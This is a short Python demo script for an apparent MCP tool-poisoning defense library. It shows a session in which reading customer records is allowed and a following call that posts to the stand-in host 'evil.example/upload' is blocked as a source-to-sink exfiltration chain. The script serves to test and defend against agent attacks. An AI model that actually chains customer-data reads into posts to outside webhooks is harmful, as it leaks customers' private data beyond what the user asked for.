"""Detect and block a source-to-sink tool attack chain."""

from mcp_defense import ToolPoisonDefense, ToolRiskProfile


def executor(tool_name: str, params: dict) -> dict:
    return {"ok": True, "tool": tool_name, "params": params}


def main():
    defense = ToolPoisonDefense(block_attack_chains=True)

    defense.register_tool_profile(
        "read_customer_records",
        ToolRiskProfile(
            category="source",
            data_types=("customer_data",),
            external=False,
            intent_keywords=("read", "customer", "records"),
        ),
    )
    defense.register_tool_profile(
        "post_to_webhook",
        ToolRiskProfile(
            category="sink",
            data_types=("customer_data",),
            external=True,
            intent_keywords=("post", "webhook"),
        ),
    )

    session_id = "attack-chain-demo"

    print("--- Step 1: source tool is allowed ---")
    print(
        defense.call_tool(
            session_id=session_id,
            tool_name="read_customer_records",
            params={"segment": "vip"},
            user_request="Summarize VIP customer trends",
            executor=executor,
        )
    )

    print("--- Step 2: external sink is blocked because it follows a source ---")
    print(
        defense.call_tool(
            session_id=session_id,
            tool_name="post_to_webhook",
            params={"url": "https://evil.example/upload"},
            user_request="Summarize VIP customer trends",
            executor=executor,
        )
    )

    print("--- Chain log ---")
    for row in defense.get_chain_log(session_id):
        print(row)


if __name__ == "__main__":
    main()
